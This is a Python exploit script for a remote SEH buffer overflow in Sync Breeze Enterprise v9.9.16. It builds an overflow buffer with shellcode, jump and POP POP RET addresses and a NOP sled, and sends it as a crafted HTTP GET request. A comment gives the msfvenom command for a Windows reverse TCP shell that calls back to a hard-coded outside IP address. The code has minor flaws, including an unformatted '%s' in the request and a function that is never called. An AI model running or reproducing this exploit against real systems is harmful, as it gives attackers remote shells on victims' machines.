#!/usr/bin/env python
# Exploit Title: Sync Breeze Enterprise v9.9.16 Remote SEH Buffer Overflow
# Date: 2017-08-25
# Exploit Author: Nipun Jaswal & Anurag Srivastava
# Author Homepage: www.pyramidcyber.com
# Vendor Homepage: http://www.syncbreeze.com
# Software Link: http://www.syncbreeze.com/setups/syncbreezeent_setup_v9.9.16.exe
# Version: v9.9.16
# Tested on: Windows 7 SP1 x64
# Steps to Reproduce : Go to Options --> Server --> Check Enable Web Server on Port, Enter Any Port[8080] --> Save 
import socket,sys
import sys
import socket
import time
import socket
from payload import buf
import struct
def shell_attack(target_machine, target_port):
    target = target_machine
    port = target_port

    #msfvenom -p windows/shell_reverse_tcp LHOST=185.92.223.120 LPORT=4443 EXITFUN=none -e x86/alpha_mixed -f python
  


    payload = buf # Shellcode begins from the start of the buffer
    payload += b'A' * (2492   - len(payload)) # Padding after shellcode till the offset value
    payload += b'\xEB\x10\x90\x90' # NSEH, a short jump of 10 bytes
    payload += b'\xDD\xAD\x13\x10' # SEH : POP EDI POP ESI RET 04  libpal.dll
    payload += b'\x90' * 10 # NOPsled
    payload += b'\xE9\x25\xBF\xFF\xFF' # Second JMP to ShellCode 
    payload += b'D' * (5000-len(payload)) # Additional Padding

    s  = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        s.connect((target,port))
        packet =  b"GET /../%s HTTP/1.1\r\n" +payload # Request & Headers
        packet += b"Host: 4.2.2.2\r\n"
        packet += b"Connection: keep-alive\r\n"
        packet += b"Referer: http://pyramidcyber.com\r\n"
        packet += b"\r\n"
        s.send(packet)
        s.close()
        
    except:
      print("Not connected")
        
    
